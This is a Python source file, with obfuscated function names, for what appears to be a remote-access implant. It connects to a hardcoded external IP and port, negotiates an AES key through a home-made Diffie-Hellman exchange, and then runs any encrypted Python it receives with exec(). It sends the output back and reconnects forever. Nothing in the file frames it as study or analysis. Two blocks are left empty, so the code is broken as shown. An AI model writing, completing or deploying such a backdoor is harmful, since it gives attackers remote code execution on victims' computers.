
import io
import os
import sys
import time
import socket
import base64
import random
import signal
import hashlib
import subprocess
from threading import Thread
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa


client_sockets = []
active_connections = []

def MClHJkhdlNdLvQcp(sig, frame):

    for client_socket in client_sockets:
        client_socket.close()

    sys.exit(0)

signal.signal(signal.SIGINT, MClHJkhdlNdLvQcp)

pem_key = """-----BEGIN RSA PUBLIC KEY-----
MIICCgKCAgEAmPJ5v+Wh5OQSMe2WvXwkLVME19/I5n6JRCCwMhXpN9LYUJl/Z0yr
Od8XRCq4/LvuIkEV8uJGC1QwH1cEqGNhrPIOKzR6j/1PlCpwCwxi1lFdrEf0Jy2F
9Q8VW7z/wQEC9uUKwnsZG7R5ZP4uKQh4ElbW00aYk2FMmPh0T50+buxyKFG2G220
fYfjacHPkBuss3RZnyc2KsZC2GsS8siSE7tQFmLZwtRgV4IYTSwzupGDxhzc1shA
TVOat0fdp/m5OuGrJuBGsu0R0jNUiTwILPYm925a84qQyGn01UBpHy8kKnG5SyVG
F+6L91zsCosp85BpCNsUdaAV9qe5m/W4KTQgXttyp+KwrX+tuyvbtq8JPNvCbiB3
ibA4ZiSVrL0/laNyJj7UPJPQXXWXErMgPTRd4eb0RJCAbs1uem113jXh14a9JrJW
qo6XvXQuvpDWK2qIh0nbxO7hAWpGg+ujSFjl15ZeGkmlMKaJKaD0j3sEQPYiUdzo
LfjPJdFA0v9Da3LCXX+lkoy+NfdL2HfVjC8heMZw+d56sV84Kxqnu8jBM5wHoTvw
ObLJHw7wp0Aa/7Q7Mb0rbNT5g6+sXMSBrEUp6rSF+ONYYGlrVs2WZG8jqxjqN+Wx
l7zPR7yGdgZbdHk8ctXLOqOqdRObDc8upwOzuCYvrkb1T+iDZtxV3sECAwEAAQ==
-----END RSA PUBLIC KEY-----
"""

pem_key = pem_key.encode('utf-8')

public_key = serialization.load_pem_public_key(pem_key)

def wYolzEUxffDiQJMN(public_key, code_snippet):

    key_size_bits = public_key.key_size

    max_data_size = (key_size_bits // 8 ) - 2 * hashes.SHA256().digest_size - 2

    if len(code_snippet) > max_data_size:
        sys.exit(0)

    try:
        encrypted_code = public_key.encrypt(
            code_snippet,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
    except Exception as e:
        sys.exit(1)

    encrypted_code_base64 = base64.b64encode(encrypted_code).decode('utf-8')
    return encrypted_code_base64


def qTrqXtaDKjLnsTnr(client):
    response = client.recv(4096)
    response = response.decode()

    n, g = response.split(',')
    n = int(n)
    g = int(g)

    x = random.randint(1, n - 1)
    k1 = int(pow(g, x, n))

    k1 = str(k1)
    client.send(k1.encode())

    k2 = client.recv(4096)
    k2 = int(k2.decode())

    shared_key = pow(k2, x, n)

    aes_key = int.to_bytes(shared_key, length=(shared_key.bit_length() + 7) // 8, byteorder='big')
    aes_key = hashlib.sha256(aes_key).digest()

    return aes_key


def tekRRWAZCDnnantC(target_host, target_port, local_host, local_port):

    if (target_host, target_port) in active_connections:
        return

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    client_sockets.append(client)

    try:
        client.connect((target_host, target_port))
        active_connections.append((target_host, target_port))
        
        aes_key = qTrqXtaDKjLnsTnr(client)

        request = "abd660358dd97c26a1136f5e7bf3b7243ae82e4f9b93370e53e7857fae61b43a"
        try:
            encrypted_request = OLRxHNgYFrUpolra(aes_key, request.encode())
            client.send(encrypted_request)
        except Exception as e:
            pass

        banner = "b7afd39a9616dbecb8e9834f817c929096223bf9930b6339ee1bf4a0a65eb9f4"
        try:
            banner = OLRxHNgYFrUpolra(aes_key, banner.encode())
        except Exception as e:
            pass


        while True:

            client.send(banner)

            instructions = client.recv(4096)
            try:
                decrypted_instructions = haWdimyzEFoAmMNm(aes_key, instructions)
            except Exception as e:
                continue

            old_stdout = sys.stdout
            new_stdout = io.StringIO()
            sys.stdout = new_stdout

            try:
                exec(decrypted_instructions)
                output = new_stdout.getvalue()
                if output:
                elif output == "":
                    output = "empty response"
            except Exception as e:
                output = e
            finally:
                sys.stdout = old_stdout


            result = OLRxHNgYFrUpolra(aes_key, output.encode())
            client.send(result)

            time.sleep(1)


    except Exception as e:

    finally:
        if (target_host, target_port) in active_connections:
            active_connections.remove((target_host, target_port))

        client.close()

def OLRxHNgYFrUpolra(key, plaintext):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    padder = sym_padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(plaintext) + padder.finalize()

    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
    return iv + ciphertext

def haWdimyzEFoAmMNm(key, encrypted_message):
    iv = encrypted_message[:16]
    ciphertext = encrypted_message[16:]

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()

    padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()

    unpadder = sym_padding.PKCS7(algorithms.AES.block_size).unpadder()
    plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()

    return plaintext.decode('utf-8')


if __name__ == "__main__":

    target_host = "34.204.78.186"
    target_port = int(65500)
    local_host = private_ip = "127.0.0.1"
    local_port = 1239

    while True:
        try:
            tekRRWAZCDnnantC(target_host, target_port, local_host, local_port)
        except Exception as e:
            time.sleep(1)
            continue

        time.sleep(5)
